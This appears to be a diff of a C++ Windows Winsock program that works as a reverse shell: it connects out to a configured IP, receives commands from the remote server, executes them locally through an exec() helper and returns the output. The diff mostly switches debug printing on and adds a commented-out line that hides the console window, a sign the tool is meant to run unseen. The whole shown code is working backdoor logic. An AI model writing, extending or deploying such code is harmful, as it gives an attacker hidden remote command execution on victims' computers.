@@ -13,7 +13,10 @@
 #include <memory>
 #include <stdexcept>
 #include <array>
+#include <cstring>
 using namespace std;
+
+
 
 // Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
 #pragma comment (lib, "Ws2_32.lib")
@@ -40,7 +43,8 @@ string exec(const char* cmd) {
 
 int __cdecl main()
 {
-    cout << "Starting" << endl;
+    cout << "Starting\n";
+    //ShowWindow(GetConsoleWindow(), SW_HIDE);
     string conMsg = "?connect";
     const char* argv = DEFAULT_IP;
     WSADATA wsaData;
@@ -79,7 +83,7 @@ int __cdecl main()
         WSACleanup();
         return 1;
     }
-    found = true;
+
     while (found == false) {
         // Attempt to connect to an address until one succeeds
         for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
@@ -88,7 +92,7 @@ int __cdecl main()
             ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
                 ptr->ai_protocol);
             if (ConnectSocket == INVALID_SOCKET) {
-                //printf("socket failed with error: %ld\n", WSAGetLastError());
+                printf("socket failed with error: %ld\n", WSAGetLastError());
                 WSACleanup();
                 return 1;
             }
@@ -104,11 +108,11 @@ int __cdecl main()
             break;
         }
     }
-
+    cout << "Found\n";
     freeaddrinfo(result);
 
     if (ConnectSocket == INVALID_SOCKET) {
-        //printf("Unable to connect to server!\n");
+        printf("Unable to connect to server!\n");
         WSACleanup();
         return 1;
     }
@@ -116,13 +120,13 @@ int __cdecl main()
     // Send an initial buffer
     iResult = send(ConnectSocket, conMsg.c_str(), recvbuflen, 0);
     if (iResult == SOCKET_ERROR) {
-        //printf("send failed with error: %d\n", WSAGetLastError());
+        printf("send failed with error: %d\n", WSAGetLastError());
         closesocket(ConnectSocket);
         WSACleanup();
         return 1;
     }
 
-    //printf("Bytes Sent: %ld\n", iResult);
+    printf("Bytes Sent: %ld\n", iResult);
 
 
     // Receive until the peer closes the connection
@@ -133,18 +137,18 @@ int __cdecl main()
             string res;
             iResult = recv(ConnectSocket, &buffer[0], sizeof(buffer), 0);
             if (iResult > 0) {
-                //printf("Bytes received: %d\n", iResult);
+                printf("Bytes received: %d\n", iResult);
                 msg = buffer;
-                //cout << "Command recieved: " << msg << endl;
+                cout << "Command recieved: " << msg << endl;
             }
             else if (iResult == 0) {
-                //printf("Connection closed\n");
+                printf("Connection closed\n");
                 closesocket(ConnectSocket);
                 WSACleanup();
                 return 0;
             }
             else {
-                //printf("recv failed with error: %d\n", WSAGetLastError());
+                printf("recv failed with error: %d\n", WSAGetLastError());
                 closesocket(ConnectSocket);
                 WSACleanup();
                 return 0;
@@ -160,24 +164,25 @@ int __cdecl main()
                 res = "?true";
             }
             else {
+                cout << msg << endl;
                 res = exec(buffer);
             }
             //res = exec(buffer);
             iResult = send(ConnectSocket, res.c_str(), DEFAULT_BUFLEN, 0);
             if (iResult == SOCKET_ERROR) {
-                //printf("send failed with error: %d\n", WSAGetLastError());
+                printf("send failed with error: %d\n", WSAGetLastError());
                 closesocket(ConnectSocket);
                 WSACleanup();
                 return 1;
             }
 
-            //printf("Bytes Sent: %ld\n", iResult);
+            printf("Bytes Sent: %ld\n", iResult);
         } while (iResult > 0);
     }
     // shutdown the connection since no more data will be sent
     iResult = shutdown(ConnectSocket, SD_SEND);
     if (iResult == SOCKET_ERROR) {
-        //printf("shutdown failed with error: %d\n", WSAGetLastError());
+        printf("shutdown failed with error: %d\n", WSAGetLastError());
         closesocket(ConnectSocket);
         WSACleanup();
         return 1;
